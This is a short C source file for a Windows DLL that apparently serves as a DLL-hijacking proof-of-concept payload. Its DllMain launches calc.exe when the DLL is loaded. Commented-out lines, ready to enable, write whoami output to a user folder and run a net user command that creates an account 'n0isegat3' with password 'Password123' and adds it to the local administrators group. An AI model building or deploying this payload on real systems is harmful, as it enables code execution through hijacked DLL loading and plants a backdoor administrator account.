#include <Windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBox(NULL,
		//	"You have been hijacked by n0isegat3!",
		//	"n0isegat3 dll hijack",
		//	MB_ICONEXCLAMATION | MB_OK
		//);
		//
		//system("whoami > C:\\users\\ranger\\whoami.txt");
		// 
		WinExec("calc.exe", 0);
		//
		//WinExec("cmd.exe /c net user n0isegat3 Password123 /add ; net localgroup administrators n0isegat3 /add", 0);
		//exit(0);
		//
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

